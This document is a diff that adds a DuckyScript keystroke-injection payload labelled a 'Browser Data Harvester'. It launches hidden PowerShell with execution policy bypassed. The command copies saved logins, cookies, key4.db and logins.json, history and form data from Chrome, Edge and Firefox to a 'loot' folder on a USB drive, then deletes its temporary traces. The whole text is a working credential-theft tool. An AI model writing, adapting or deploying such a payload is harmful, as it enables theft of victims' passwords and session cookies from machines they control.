@@ -1,0 +1,12 @@
+REM ================================================
+REM  FLLC — Browser Data Harvester
+REM  Copies browser history, bookmarks, and login
+REM  data files from Chrome, Edge, Firefox to USB.
+REM  Target: Windows 10/11 | Time: ~10 seconds
+REM ================================================
+
+DELAY 800
+GUI r
+DELAY 500
+STRING powershell -w hidden -nop -ep bypass -c "$h=hostname;$ts=Get-Date -f 'yyyyMMdd_HHmmss';$tmp=\"$env:TEMP\fllc_bh_$ts\";New-Item -ItemType Directory -Path $tmp -Force|Out-Null;$paths=@{Chrome=\"$env:LOCALAPPDATA\Google\Chrome\User Data\Default\";Edge=\"$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\";Firefox=\"$env:APPDATA\Mozilla\Firefox\Profiles\"};foreach($b in $paths.Keys){$p=$paths[$b];if(Test-Path $p){$d=\"$tmp\$b\";New-Item -ItemType Directory -Path $d -Force|Out-Null;foreach($f in @('History','Bookmarks','Login Data','Cookies','Web Data')){$src=Join-Path $p $f;if(Test-Path $src){Copy-Item $src $d -Force 2>$null}};if($b -eq 'Firefox'){Get-ChildItem $p -Directory|ForEach-Object{$fd=\"$d\$($_.Name)\";New-Item -ItemType Directory -Path $fd -Force|Out-Null;foreach($f in @('places.sqlite','logins.json','key4.db','cookies.sqlite')){$src=Join-Path $_.FullName $f;if(Test-Path $src){Copy-Item $src $fd -Force 2>$null}}}}}};$usb=(Get-WmiObject Win32_LogicalDisk|?{$_.DriveType -eq 2}|Select -First 1).DeviceID;if($usb){$ld=\"$usb\loot\browsers_$($h)_$ts\";Copy-Item $tmp $ld -Recurse -Force};Remove-Item $tmp -Recurse -Force"
+ENTER
